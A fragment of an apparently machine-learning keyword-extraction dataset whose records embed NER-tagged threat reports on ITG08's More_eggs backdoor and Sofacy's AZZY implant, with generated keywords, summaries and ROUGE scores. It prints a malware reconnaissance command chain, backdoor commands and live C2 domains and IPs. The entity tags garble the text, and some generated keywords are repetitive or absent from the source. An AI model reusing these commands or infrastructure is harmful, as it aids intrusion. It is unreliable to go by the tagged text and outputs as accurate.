agent string ] infected device using a series of [ORG] WMIC commands . \u201c%comspec% /c wmic path win32_Operatingsystem get [ORG] SerialNumber /FORMAT : Textvaluelist | \ufb01nd\u2010 str /R /C:\\\u201dSerialNumber=\\ \u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\12025.txt\\ \u201d & vol % HOMEDRIVE% > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\50573.txt\\ \u201d & wmic csproduct get Name /FORMAT : Textvaluelist | \ufb01ndstr /R /C:\\\u201dName=\\ \u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\58678.txt\\ \u201d & tasklist /FO [ORG] CSV /NH > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\39054.txt\\ \u201d & ver > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\28535.txt\\ \u201d & wmic os get [ORG] ProductType /FORMAT : Textvaluelist | \ufb01ndstr /R /C:\\\u201dProductType=\\ \u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\4140.txt\\ \u201d & ipcon\ufb01g | \ufb01ndstr /R /C:\\\u201dIPv4 Address\\ \u201d > \\\u201dC:\\\\Users\\\\mal_re\\\\AppData\\\\Local\\\\Temp\\\\65390.txt\\\u201d\u201dFigure [CARDINAL] 12 : System information collectionThe infected device \u2019s system information is written to [PERCENT] several [PERCENT] % Temp%\\<random-\ufb01lenames>.txt \ufb01les . The contents of the \ufb01les are read and then the \ufb01les themselves are deleted . The [PERSON] More_eggs backdoor accepts the following commands from its remote operator : CommandDescriptiond&execDownload and execute an executable ( .exe or .dll).more_eggsDelete the current [GPE] More_eggs and replace it . [ORG] GtfoUninstall activity.more_onion Execute a script.via_cRun a command using \u201c cmd.exe /C\u201d . Figure [CARDINAL] 13 : More_eggs commands [PERSON] Meterpreter [PERSON] Reverse TCP Stagers Beyond using [PERSON] More_eggs as a backdoor , the attackers in this campaign also used offensive security tools and [ORG] PowerShell scripts to carry out the different stages of the attack.url Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainThe [PERSON] PowerShell scripts analyzed during our investigation contained [ORG] Metasploit [ORG] Reverse [ORG] TCP stagers . These stagers were used to execute shellcode that connected back to an attacker \u2019s server and injected [ORG] Meterpreter components , such as [PERSON] Mimikatz , into the memory space of legitimate processes . After injecting Meterpreter into memory , the attacker had complete control of the infected device . The reverse [ORG] TCP PowerShell stagers functioned as follows:1 . The reverse [ORG] TCP PowerShell stagers were obfuscated with base64 encoding and [ORG] GZipcompression . This encoding scheme is standard for Meterpreter PowerShell stagers . The original command contained a base64 - encoded loader script.2 . The loader script base64 decodes , [GPE] Gzip decompresses and executes a [ORG] MetasploitPowerShell re\ufb02ection payload in [GPE] memory.3 . The re\ufb02ection payload base64 decodes a Meterpreter reverse [ORG] TCP shellcode , injects it intomemory using .NET re\ufb02ection methods and executes the decoded shellcode.4 . The shellcode connects back to the attacker \u2019s server . Meterpreter components , such as thecore module and metsvr.dll , and extensions , such as [PERSON] Mimikatz , are injected into the memory space of a legitimate process . Figure [CARDINAL] 14 : Original commandFigure [CARDINAL] 15 : Decoded loaderFigure [CARDINAL] 16 : Decoded re\ufb02ection payload [PERSON] Metasploit [PERSON] Shellcode [PERSON] Loader As our analysis continued , X - [ORG] Force [ORG] IRIS found a UPX - packed [PERSON] Metasploit shellcode loader ( 49340.txt ) during the forensic investigation of compromised devices . This loader attempted to masquerade as the Apache Bench application and notably contained metadata and project paths ( .PDB ) , indicating that it may be attempting to masquerade as other applications as well , a rather typical behavior for malicious binaries . The shellcode was loaded into memory and designed to receive an RC4 - encrypted buffer , which was decrypted and executed in memory . The sample also contained a [PERSON] Comodo code - signing certi\ufb01cate issued to \u201c MAHTEM LTD , \u201d which we believe is one of a number of fake companies established to purchase the certi\ufb01cates . The sample we analyzed further contained \ufb01ve binary entries in a resource named \u201c [WORK_OF_ART] REGISTRY \u201d \u2014 [CARDINAL] 35 , [CARDINAL] 224 , [CARDINAL] 409 , [DATE] 3908 and [CARDINAL] 4994 \u2014 each containing some obfuscated shellcode . Once loaded into memory , the shellcode connected back to a remote host , receiving 4 bytes in return . Those were [ORG] XORed with the string 0xad350bdd and had 0x100 added to it . This value was then used as the size speci\ufb01cation for the next received buffer , which was RC4 - decrypted with the resulting [QUANTITY] 16 - byte key and executed in memory . A ReverseShell Executable Yet another tool in the attackers \u2019 arsenal for this campaign was a [ORG] DLL backdoor executable that X - [ORG] Force [ORG] IRIS found during the investigation . When executed via its DllRegisterServer export function , the [ORG] DLL connected to a remote host on port [CARDINAL] 443 and created a reverse shell . In this investigation , the [ORG] DLL connected to [CARDINAL] 185[.]204[.]2[.]182 and contained a [PERSON] Comodo code - signing certi\ufb01cate issued to \u201c [ORG] D [ORG] Bacte [ORG] Ltd. \u201durl Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainITG08 [PERSON] Attacks Organizations for Financial Gain ITG08 has been around for over [DATE] four [DATE] years now . Its attacks are \ufb01nancially motivated , sophisticated and persistent . The group historically has specialized in stealing payment card data from POS machines and has more recently expanded operations to target card - not - present data from online transactions . To follow information about ITG08 as it emerges , please join us on X- Effective network defense and threat intelligence rely on multiple factors , such as knowing the network \u2019s attack surface , understanding the threat actor \u2019s motivations and TTPs , and the skill and knowledge of the security team that enable it to identify malicious behavior . [ORG] IBM X - [ORG] Force [ORG] IRIS has gained insight into ITG08 \u2019s intrusion methods , ability to navigate laterally , use of custom and open - source tools , and typical persistence mechanisms . Our team has provided the following mitigation tips for defenders who are looking out for attacks by this group . Educate Users About [PERSON] Email X - [PERSON] Force [PERSON] IRIS determined that the ITG08 compromise was the result of a phishing email in which the initial compromise was made possible by a victim who clicked on a malicious attachment . [GPE] Role - based security awareness training should be at the top of the list of any organization \u2019s mitigation strategies to help employees recognize phishing emails and possible malicious attachments , and to educate them about their security responsibilities with regards to reporting potentially malicious emails . Search for Known IoCs After the phishing email resulted in a successful in\ufb01ltration , ITG08 used the [PERSON] More_eggs backdoor to gain a foothold and infect additional devices . More_eggs - related artifacts such as the [ORG] DLL dropper have extremely low antivirus ( AV ) detection rates , based on analysis conducted via [ORG] VirusTotal ( [GPE] VT ) . For example , a More_eggs DLL dropper submitted to [GPE] VT on [DATE] April 18 , [DATE] 2019 had a detection rate of [PERCENT] only [PERCENT] 5 [PERCENT] percent . To detect this malware , critical events should be analyzed based on the attacker \u2019s patterns . SYSMON or an endpoint detection and response tool should be con\ufb01gured to detect the combined use of msxsl.exe and [ORG] WMI . In addition , Registry keys and scheduled tasks should be analyzed for indications of persistence . The network should also be scrutinized for any privilege escalation events and any signs of internal reconnaissance . [ORG] YARA signatures should also be created to assist security personnel in detecting the [PERSON] More_eggs malware . [ORG] YARA signatures for [ORG] X- [ORG] Force [ORG] IRIS premium subscribers can be provided on request . [PERSON] Analyze [PERSON] Logs Other mitigation strategies against this type of activity include analyzing host - based \ufb01rewall logs for internal pivoting , unauthorized listening executables and scanning activity . In addition , con\ufb01guring [ORG] PowerShell script logging and identifying any obfuscation will assist in mitigating ITG08 \u2019s use of [ORG] PowerShell to conduct malicious activity . ITG08 has also demonstrated the use of stolen credentials ; therefore , multiple failed login attempts and/or unauthorized account usage may be indicators of ITG08 activity on a network.url Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainMonitor for Remote Services X - Force IRIS also recommends taking steps to prevent lateral movement . Although lateral movement can be dif\ufb01cult to detect , a spike in usage of Windows tools , such as remote administration services ( [ORG] PowerShell [ORG] Remoting and [ORG] WMI ) , should be monitored . Detection and monitoring capabilities should be in place and network defenders should be familiar with what is considered a \u201c normal \u201d baseline on their user network . Without a baseline of \u201c normal \u201d activity , the use of Windows tools may blend in with legitimate activity , which can allow attackers to continue to live off the land unnoticed . [ORG] Rethink [ORG] Network [ORG] Architecture [ORG] Security defenders should examine network architecture to see how the network is segregated , what Windows tools are restricted or used by administrators , and what alerts are set up to warrant personnel review . Least privilege principals should be implemented for all users on the network , and a strong password management system with [CARDINAL] two - factor authentication and password expiration dates should be deployed as an additional layer of security . Pen Test ! Organizations looking to limit the ways by which attackers can in\ufb01ltrate their networks should be mindful of ongoing patching of vulnerabilities . After reaching maturity on the vulnerability assessment front , mitigation strategies should also include penetration testing to \ufb01nd unknown vulnerabilities related to people , software and hardware used on the organization \u2019s critical assets and externally facing resources . Incident [PERSON] Response [PERSON] Nowadays , no organization can be exempt from planning and drilling incident response plans in the face of potential security incidents . Conducting tabletop exercises and regularly drilling plans can help organizations proactively prepare and take control of an incident if ever one should occur . For additional resources and information , please check out X - [ORG] Force [ORG] IRIS . If you believe your organization may be under attack , please call [ORG] the X - [ORG] Force [ORG] Emergency Response Hotline at 888- 241 - 9812 . Appendix A : IoCs More_eggs [ORG] C&C domains : api[.]cloudservers[.]kz mail[.]rediffmail[.]kz secure[.]cloudserv[.]ink metric[.]onlinefonts[.]kz news[.]bradpitt[.]kzLanding page domains ( downloads \ufb01les):url\ufb01ng[.]services usstaf\ufb01ng[.]services jobhyper[.]com12/138/31/2019More_eggs , Anyone ? Threat Actor ITG08 [PERSON] Strikes [PERSON] AgainMeterpreter [PERSON] C&C [PERSON] IP addresses:185[.]162[.]128[.]70 * . [CARDINAL] 185[.]243[.]115[.]50 192[.]99[.]20[.]90 192[.]187[.]103[.]42 Cyber Threat Hunt Analyst , [ORG] IBM [ORG] SecurityOle [ORG] Villadsen is an analyst on [ORG] the [ORG] Threat [ORG] Hunt [ORG] & [ORG] Discovery [ORG] Team within [ORG] IBM X - [ORG] Force [ORG] Incident [ORG] Response and [ORG] Intelligence [ORG] Services ( [ORG] IRIS ) , where he investiga read moreurl", "generated_text": "the threat actor; ITG08; FIN6; 2015; point-of-sale; POS machines; retailers; companies; the hospitality sector; e-commerce environments; malicious code; online checkout pages; compromised websites; malicious code; fraudulent code; pay card data; victims; LinkedIn; the attacks; the More_eggs backdoor; Terra Loader; SpicyOmelette; The backdoor; PowerShell scripts; Metasploit; PowerShell commands; Windows Management Instrumentation; WMI; Comodo; C2; the attackers; APT attacks; 2019; the attack; the campaign; established communication; employees.", "ref_text": "<START-1>The PDF describes an investigation by IBM X-Force Incident Response and Intelligence Services (IRIS) into recent attacks by the financially motivated cybercrime group ITG08 (also known as FIN6). ITG08 has been active since 2015 targeting point-of-sale systems and hospitality companies in the US and Europe. The investigation found ITG08 used spear phishing emails with fake job ads to target specific employees and trick them into downloading malware. The main malware used was More_eggs, a backdoor sold on the dark web. Other tools included Metasploit for lateral movement and signed binaries and DLLs to establish persistence. Once initial access was gained, ITG08 moved laterally with Windows tools like WMI and PowerShell. They escalated privileges using Mimikatz and harvested credentials. The group also made heavy use of obfuscation techniques like base64 encoding. Based on the TTPs observed, IBM assesses with high confidence that ITG08 was behind this new campaign. The use of More_eggs and fake job ads links it to previous ITG08 activity reported in 2018-2019. The group continues to evolve, expanding from POS malware to card-not-present fraud. Mitigation tips include user education on phishing, monitoring for ITG08 IOCs and TTPs, controlling Windows tools often abused by attackers, and implementing strong password policies and 2FA. Regular pen testing and incident response exercises also help strengthen defenses. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.49, "gpt3/lexical/rouge_rouge2": 0.20100502512562815, "gpt3/lexical/rouge_rougeL": 0.30500000000000005, "gpt3/lexical/rouge_rougeLsum": 0.30500000000000005, "gpt3_generated_text": ["The article discusses the recent attacks by the threat actor ITG08, also known as FIN6. ITG08 is a cybercrime gang that has been active since 2015, primarily targeting point-of-sale (POS) machines in retailers and companies in the hospitality sector. However, more recently, the group has been observed targeting e-commerce environments by injecting malicious code into online checkout pages of compromised websites, stealing payment card data. The attackers use spear phishing emails advertising fake job advertisements to target specific employees, and they deploy the More_eggs JScript backdoor malware to create and expand their foothold in compromised environments. The attackers also employ various tactics and techniques, such as Windows Management Instrumentation (WMI) and PowerShell scripts, to move laterally and deploy malware. The use of Comodo code-signing certificates was also detected during the campaign. The article provides details on the spear phishing and intrusion tactics used by ITG08, as well as information on the More_eggs backdoor. The attacks and TTPs identified in this case overlap with previous reports by Visa and Proofpoint researchers in 2019."]}, {"split_name": "val", "sample_id": "val_107", "prompt_text": "Extract the keywords: \u25bc [CARDINAL] 47111FacebookGoogleTwitterSofacy ( also known as \u201c [WORK_OF_ART] Fancy [WORK_OF_ART] Bear \u201d , \u201c Sednit \u201d , \u201c [FAC] STRONTIUM \u201d and \u201c APT28 \u201d ) is an advanced threat group that has been active since [DATE] around [DATE] 2008 , targeting mostly military and government entities worldwide , with a focus on [ORG] NATO countries . More recently , we have also seen an increase in activity targeting [GPE] Ukraine . Back in 2011 - 2012 , the group used a relatively tiny implant ( known as \u201c Sofacy \u201d or SOURFACE ) as its [ORDINAL] first stage malware . The implant shared certain similarities with the old Miniduke implants . This led us to believe the [CARDINAL] two groups were connected , at least to begin with , although it appears they parted ways in [DATE] 2014 , with the original Miniduke group switching to the CosmicDuke implant . At some point during [DATE] 2013 , the [ORG] Sofacy group expanded its arsenal and added more backdoors and tools , including [PERSON] CORESHELL , [ORG] SPLM ( aka [PERSON] Xagent , aka [ORG] CHOPSTICK ) , [PERSON] JHUHUGIT ( which is built with code from the [PERSON] Carberp sources ) , [ORG] AZZY ( aka [ORG] ADVSTORESHELL , [ORG] NETUI , [ORG] EVILTOSS , and spans across [CARDINAL] four [CARDINAL] to [CARDINAL] five generations ) and a few others . We \u2019ve seen quite a few versions of these implants and they were relatively widespread for a time.#Sofacy group has been active since [DATE] 2008 , targeting mostly military and government entities in [ORG] NATO countriesTweetEarlier [DATE] this [DATE] year , we noticed a new release of the [ORG] AZZY implant which , at the time , was largely undetected by anti - malware products . We observed several waves of attacks using this version , most recently in [DATE] October . The new waves of attacks also included a new generation of [ORG] USB stealers deployed by the [ORG] Sofacy actor , with the [ORDINAL] first versions dating back to [DATE] February [DATE] 2015 , and which appear to be geared exclusively towards high profile targets . In [DATE] the [DATE] months leading up to [DATE] August , the [ORG] Sofacy group launched several waves of attacks relying on zero - day exploits in [ORG] Microsoft [ORG] Office , Oracle [PERSON] Sun [PERSON] Java , [PERSON] Adobe [PERSON] Flash [PERSON] Player and Windows itself . For instance , its [PERSON] JHUHUGIT implant was delivered through a Flash zero - day and used a [ORG] Windows [ORG] EoP exploit to break out of the sandbox . The [PERSON] JHUHUGIT implant became a relatively popular [ORDINAL] first stage for the Sofacy attacks and was used again with a Java zero - day ( CVE-2015 - 2590 ) in [DATE] July [DATE] 2015.While the [PERSON] JHUHUGIT ( and more recently , \u201c JKEYSKW \u201d ) implant used in most of the [ORG] Sofacy attacks , high profile victims are being targeted with another [ORDINAL] first level implant , representing the latest evolution of their [ORG] AZZYTrojan . [CARDINAL] Two recurring characteristics of the # [ORG] Sofacy group are speed and the use of multi - backdoor packagesTweetThe [ORDINAL] first versions of the new [ORG] AZZY implant appeared in [DATE] August [DATE] of [DATE] this [DATE] year . During a high profile incident we investigated , our products successfully detected and blocked a \u201c standard \u201d Sofacy \u201c AZZY \u201d sample that was used to target a range of defense contractors . The sample used in this attack ( md5 A96F4B8AC7AA9DBF4624424B7602D4F7 , compiled [DATE] July 29th , [DATE] 2015 ) was a pretty standard Sofacy x64 [ORG] AZZY implant , which has the internal name \u201c advshellstore.dll\u201d . Interestingly , the fact that the attack was blocked did n\u2019t appear to stop the Sofacy team . [TIME] Just [TIME] an [TIME] hour [TIME] and [TIME] a [TIME] half [TIME] later they had compiled and delivered another [ORG] AZZY x64 backdoor ( md5 : [CARDINAL] 9D2F9E19DB8C20DC0D20D50869C7A373 , compiled [DATE] August 4th , [DATE] 2015 ) . This was no longer detectable with static signatures by our product . However , it was detected dynamically by the host intrusion prevention subsystem when it appeared in the system and was executed . This recurring , blindingly - fast Sofacy attack attracted our attention as neither sample was delivered through a zero - day vulnerability \u2014 instead , they appeared to be downloaded and installed by another malware . This separate malware was installed by an unknown attack as \u201c AppData\\Local\\Microsoft\\Windows\\msdeltemp.dll \u201d ( md5 : CE8B99DF8642C065B6AF43FDE1F786A3).The top level malware , CE8B99DF8642C065B6AF43FDE1F786A3 ( named by its authors \u201c msdeltemp.dll \u201d according to internal strings , and compiled [DATE] July 28th , [DATE] 2015 ) is a rare type of the Sofacy AZZY implant . It has been modified to drop a separate [ORG] C&C helper , ( md5 : 8C4D896957C36EC4ABEB07B2802268B9 ) as \u201c tf394kv.dll\u201c . The dropped \u201c tf394kv.dll \u201d file is an external [ORG] C&C communications library , compiled on [DATE] July 24th , [DATE] 2015 and used by the main backdoor for all Internet - based communications . Decrypted configuration block of the [ORG] C&C helper library \u201c tf394kv.dll\u201cThis code modification marks an unusual departure from the typical [ORG] AZZY backdoors , with its [ORG] C&C communication functions moved to an external [ORG] DLL file . In the past , the Sofacy developers modified earlier [ORG] AZZY backdoors to use a [ORG] C&C server encoded in the registry , instead of storing it in the malware itself , so this code modularisation follows the same line of thinking . In addition to the new [ORG] AZZY backdoors with side - DLL for [ORG] C&C , we observed a new set of data - theft modules deployed against victims by the [ORG] Sofacy group . Among the most popular modern defense mechanisms against APTs are air - gaps \u2014 isolated network segments without Internet access , where sensitive data is stored . In the past , we \u2019ve seen groups such as [ORG] Equation [ORG] and [ORG] Flame use malware to steal data from air - gapped networks . The [ORG] Sofacy group uses such tools as well . The [ORDINAL] first versions of these new [ORG] USB stealer modules appeared around [DATE] February [DATE] 2015 and the latest appear to have been compiled in [DATE] May [DATE] 2015 . Older versions of these [ORG] USBSTEALER modules were which is named internally as msdetltemp.dll . This data theft module appears to have been compiled in [DATE] May [DATE] 2015 and is designed to watch removable drives and collect files from them , depending on a set of rules defined by the attackers . The stolen data is copied into a hidden directory as \u201c % MYPICTURES%\\%volume serial number% \u201c , from where it can be exfiltrated by the attackers using [CARDINAL] one of the [ORG] AZZY implants . More details on the new [ORG] USB stealers are available in the section on technical analysis . Over [DATE] the [DATE] last [DATE] year , the [ORG] Sofacy group has increased its activity almost tenfold when compared to [DATE] previous [DATE] years , becoming one of the most prolific , agile and dynamic threat actors in the arena . This activity spiked in [DATE] July [DATE] 2015 , when the group dropped [CARDINAL] two completely new exploits , an [ORG] Office and Javazero - day . At [DATE] the [DATE] beginning [DATE] of [DATE] August , [ORG] Sofacy began a new wave of attacks , focusing on defense - related targets . As of [DATE] November [DATE] 2015 , this wave of attacks is ongoing . The attackers deploy a rare modification of the [ORG] AZZY backdoor , which is used for the initial reconnaissance . Once a foothold is established , they try to upload more backdoors , [ORG] USB stealers as well as other hacking tools such as \u201c Mimikatz \u201d for lateral movement . Over [DATE] the [DATE] last [DATE] year , the # [ORG] Sofacy group has increased its activity almost tenfold , that spiked in [DATE] July [DATE] 2015TweetTwo recurring characteristics of the [ORG] Sofacy group that we keep seeing in its attacks are speed and the use of multi - backdoor packages for extreme resilience . In the past , the group used droppers that installed both the [ORG] SPLM and [ORG] AZZY backdoors on the same machine . If [CARDINAL] one of them was detected , the other one provided the attacker with continued access . As usual , the best defense against targeted attacks is a multi - layered approach . Combine traditional anti - malware technologies with patch management , host intrusion detection and , ideally , whitelisting and default - deny strategies . According to a study by the [NORP] Australian DSD , 85 % of the targeted attacks analysed could have been stopped by [CARDINAL] four simple defense strategies . While it \u2019s impossible to achieve 100 % protection , in practice and most cases all you have to do is increase your defenses to the point where it becomes too expensive for the attacker \u2013 who will just give up and move on to other targets . More information about the [ORG] Sofacy group is available to customers of [ORG] Kaspersky [ORG] Intelligent [ORG] Services . Is there a \u2018 silver bullet \u2019 to protect yourself against Sofacy ? [ORG] Learn more on [ORG] Kaspersky [ORG] Business blog . Internal name : [PERSON] DWN_DLL_MAIN.dll [PERSON] File format : PE32 DLL Linker version : [CARDINAL] 11.0 , [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] Linker timestamp : [CARDINAL] 2015.07.28 13:05:20 ( [ORG] GMT ) Exported functions:10003F30 : ? Applicate@@YGHXZ [DATE] 10004270 : ? SendDataToServer_2@@YGHPAEKEPAPAEPAK@Z 10003F60 : ? k@@YGPAUHINSTANCE__@@PBD@ZThe library starts its main worker thread from the [ORG] DllMain function . Most of the strings inside the module are encrypted with a homebrew XOR - based algorithm . In addition to that , API function names are reversed , presumably to avoid detection in memory . Once started , the code in the main thread resolves the basic API functions it needs and loads an additional library from the following location : \u201c % TEMP%\\tf394kv.dll \u201d . If this file is not present , it is recreated from a hardcoded encrypted array inside the body of the DLL.Next , the module enters an infinite loop . [TIME] Every [TIME] five [TIME] minutes it collects basic system information and sends it to the C2 server : Windows version number Hardcoded string \u201c [CARDINAL] 4.3 \u201d ( the backdoor \u2019s internal version number ) List of running processesThe main thread also spawns a separate thread for receiving new commands from the [CARDINAL] C2 servers . [TIME] Every [TIME] 10 [TIME] minutes , it sends a new request to the server . The server is expected to send back executable code and [CARDINAL] one of the following commands : Write a new file \u201c % LOCAL_APPDATA%\\dllhost.exe \u201d or \u201c % TEMP%\\dllhost.exe \u201d and execute it , then delete the file Write a new file \u201c % LOCAL_APPDATA%\\sechost.dll \u201d or \u201c % TEMP%\\sechost.dll \u201d and call its [ORDINAL] first exported function using \u201c rundll32.exe \u201d or [PRODUCT] Windows [PRODUCT] API , then delete the file Run shellcode provided by the server in a new threadWhile processing the commands , the backdoor logs all errors and execution results . The module also reads the contents of the file \u201c % APPDATA%\\chkdbg.log \u201d and appends it to the results . It then sends the aggregated log back to the C2 server . The module aborts the thread receiving C2 command after it fails to correctly execute commands [CARDINAL] more [CARDINAL] than [CARDINAL] six times in a row , i.e. if file or process creation fails . The export called \u201c k \u201d is a wrapper for the \u201c LoadLibraryA \u201d API function . The export called \u201c [PERSON] SendDataToServer_2 \u201d does exactly what the name means : it encrypts all collected data , encodes it using [PERSON] Base64 encoding and calls its additional library to send the data to the [CARDINAL] C2 server . The names of the [CARDINAL] C2 servers are hardcoded . Hardcoded [ORG] C&C servers in the main moduleThe [CARDINAL] two [ORG] C&C \u2019s hardcoded in the configuration block of the main binary are : intelnetservice[.]com intelsupport[.]netThe export called \u201c Applicate \u201d runs a standard Windows application message loop until a \u201c WM_ENDSESSION \u201d message is received . It then terminates the main thread . Internal name : snd.dll File format : PE32 DLL Linker version : [CARDINAL] 11.0 , [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] Linker timestamp : 2015.07.24 12:07:27 ( [ORG] GMT ) Exported functions:10001580 : Init 10001620 : InternetExchange 10001650 : SendDataThis external library implements a simple Wininet - based transport for the main module . The strings inside the binary are encrypted using 3DES and [PERSON] XOR and reversed . The [ORG] DllMain function initializes the library and resolves all required [PRODUCT] Windows [PRODUCT] API functions . The \u201c Init \u201d export establishes connection to port [CARDINAL] 80 of a C2 server using Wininet API . The user agent string employed is \u201c MSIE [CARDINAL] 8.0\u201d . The \u201c [PRODUCT] SendData \u201d export sends a [ORG] HTTP [ORG] POST request using a hardcoded URI \u201c /store/ \u201c . The reply , if its length is not equal to [CARDINAL] six and its contents do not contain \u201c OK \u201d is returned back to the caller . The \u201c InternetExchange \u201d export closes the established connection and frees associated handles . File format : [ORG] PE32 [ORG] EXE [ORG] File size : [CARDINAL] 142,336 bytes [ORG] Linker version : [CARDINAL] 11.0 , [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] Linker timestamp : [CARDINAL] 2015.02.10 [CARDINAL] 10:01:59 ( GMT)Most of the strings and data in the file are encrypted using 3DES and XOR.The code makes use of the Windows Crypto API for 3DES and the decryption key is stored as a standard Windows PUBLICKEYSTRUC structure : Part of the decryption algorithmHeader of [CARDINAL] one encrypted data buffer containing the hardcoded 3DES keyFirst , it creates a new directory : \u201c % LOCAL_APPDATA%\\Microsoft\\Windows \u201d . If the directory creation fails it tries to install into \u201c % TEMP% \u201d directory instead . Next it writes a hardcoded binary from its body to \u201c msdeltemp.dll \u201d into the target directory . If the file exists it then moves it to \u201c _ _ tmpdt.tmp \u201d in the same directory and continues the installation . Sets file File format : PE32 DLL File size : [CARDINAL] 73 [CARDINAL] 728 bytes [ORG] Linker version : [CARDINAL] 11.0 , [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] Linker timestamp : [CARDINAL] 2015.02.10 07:20:02 ( [ORG] GMT ) Exported functions : [CARDINAL] 10002B55 : ApplicateMost of the strings inside the binary are encrypted using a homebrew XOR - based algorithm and reversed . The library is an older version of the \u201c DWN_DLL_MAIN.dll \u201d ( md5 : [CARDINAL] one in the newer library . This version of the module does not rely on an external transport [ORG] DLL for communicating with its [CARDINAL] C2 servers ; instead it directly uses [PRODUCT] Wininet [PRODUCT] API functions . The module contains the following hardcoded [CARDINAL] C2 server names : drivres - update[.]info softupdates[.]infoThe module uses a hardcoded URL ( \u201c /check/ \u201c ) for sending [ORG] HTTP [ORG] POST requests to its [CARDINAL] C2 servers . The server is expected to send back executable code and [CARDINAL] one of the following commands : Write a new file \u201c % LOCAL_APPDATA%\\svchost.exe \u201d or \u201c % TEMP%\\svchost.exe \u201d and execute it , then delete the file Write a new file \u201c % LOCAL_APPDATA%\\conhost.dll \u201d or \u201c % TEMP%\\conhost.dll \u201d and call its [ORDINAL] first exported function using \u201c rundll32.exe \u201d or [PRODUCT] Windows [PRODUCT] API , then delete the file Run shellcode provided by the server in a new threadInternal name : msdetltemp.dll ( from resources ) File size : [CARDINAL] 50,176 bytes [PERSON] File format : [ORG] PE32 [ORG] EXE [ORG] Linker version : [CARDINAL] 10.0 , [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] Linker timestamp : [CARDINAL] 2015.02.09 11:48:01 ( GMT)Most of the strings inside the binary are encrypted using 3DES and [PERSON] XOR and reversed . The program creates the mutex \u201c mtx \u201d and an event named \u201c WerTyQ34C\u201d . Upon start , it creates a window with the class name \u201c Hello \u201d and title \u201c Program \u201d , subscribes for device arrival notifications for that window and enters a standard Windows message processing loop . The message processing function waits for the [PERSON] WM_DEVICECHANGE event and starts a new thread on its arrival . The module inspects every new disk volume attached to the system . For every disk it creates a \u201c stash \u201d directory in \u201c % root stash directory location%\\%volume serial number in hex% \u201d with attributes FILE_ATTRIBUTE_HIDDEN and FILE_ATTRIBUTE_SYSTEM . The root stash directory location may be read from the configuration file or set to the default location which is \u201c % MYPICTURES%\u201d . Then , it traverses the filesystem of the volume looking for files . Depending on the settings read from the configuration file , the scope may be narrowed to files with particular extensions and/or files created after a specified date . It is worth noting that if the source file location contains the string \u201c [WORK_OF_ART] System [WORK_OF_ART] Volume Information\\S-1 - 5- 21 - 1315235578 - 283289242\\ \u201d , then the file is deleted after copying to the \u201c stash \u201d directory . There are known related samples that are able to create such directories on removable drives , i.e. the sample \u201c NvCpld.dat \u201c . It is a text file that may contain the following configuration parameters : Path \u2013 location of the root \u201c stash \u201d directory [ORG] Ext \u2013 search for files with [CARDINAL] one of these extensions only Date \u2013 search for files not earlier than this dateInternal name : NvCpld.dll ( from export table ) , msdetltemp.dll ( from resources ) , [GPE] IGFSRVC.dll ( from resources)File format : PE32 DLL File size : [CARDINAL] 76,288 bytes [ORG] Linker version : [CARDINAL] 11.0 , [ORG] Microsoft [ORG] Visual [ORG] Studio [ORG] Linker timestamps : [CARDINAL] 2015.05.29 [CARDINAL] 11:20:32 ( [ORG] GMT ) , [CARDINAL] 2006.11.25 04:39:15 ( [ORG] GMT ) [DATE] 10002A80 : NvStopThis library is a newer version of the file collection module ( md5 : information in the resource section . The [ORG] DllMain function only decrypts the data structures and initializes Windows API pointers . The function \u201c NvMswt \u201d is a wrapper for the API function MsgWaitForMultipleObjects . The function \u201c [PRODUCT] NvReg \u201d is a wrapper for the API function RegisterClassW.The function \u201c NvStart \u201d is similar to the main function of the older module ; it creates a window and enters the message loop waiting for device arrival notifications . The only difference introduced is that an event named \u201c WerTyQ34C \u201d can be signalled by the function \u201c NvStop \u201d to terminate the message loop softupdates[.]infoTrojan . [PERSON] Win32.Sofacy.al [PERSON] Trojan.Win32.Sofacy.be Trojan.Win32.Sofacy.bf Trojan.Win32.Sofacy.bg [PERSON] Trojan.Win32.Sofacy.bi [PERSON] Trojan.Win32.Sofacy.bj [PERSON] Trojan . [ORG] Win64.Sofacy.q [ORG] Trojan . [PERSON] Win64.Sofacy.s HEUR : Trojan . [CARDINAL] Win32.GenericYour email address will not be published . Required fields are marked * Name * Email * WebsiteEnter your comment hereSelect all images with street signs.reCAPTCHAWhy this CAPTCHA?VerifyNotify me of follow - up comments by email . Notify me of new posts by email . [PERSON] Kaspersky [PERSON] Security [PERSON] Bulletin [DATE] 2015 . Top security storiesRussian financial cybercrime : how it worksKaspersky Security Bulletin . [DATE] 2016 PredictionsIT threat evolution in [CARDINAL] Q3 [DATE] 2015I am HDRoot ! Part [CARDINAL] 2The rise of .NET and [ORG] Powershell [ORG] malwareAPT [ORG] Research [ORG] Discourse at Virus Bulletin 2015Gaza cybergang , where \u2019s your IR team?Satellite Turla : [ORG] APT [ORG] Command and Control in the SkyNew activity of the Blue Termite APT \u00a9 [DATE] 2015 [PERSON] AO [PERSON] Kaspersky [PERSON] Lab . All Rights Reserved . Registered trademarks and service marks are the property of their respectiveowners . Contact us | Read our privacy policyEvents", "generated_text": "AZZY; Sofacy; Fancy Bear; Sednit; STRONTIUM; APT28; 2008; NATO countries; the group; 2014; Miniduke; the CosmicDuke; the first versions; February 2015; USB stealers; a new generation; the JHUHUGIT; JKEYSKW; JKEYSKW; the AZZYTrojan; USB; zero-day exploits; Office; Oracle; Sun Java; Microsoft Office; Excel; the device; a new generation; PlugX; NETUI; EVILTOSS; a new generation; CORESHELL; CHOPSTICK; the same time; the attackers; the device; the AZZY implant; the first versions; February 2015; October; CORESHELL; CHOPSTICK; CORESHELL; CHOPSTICK; 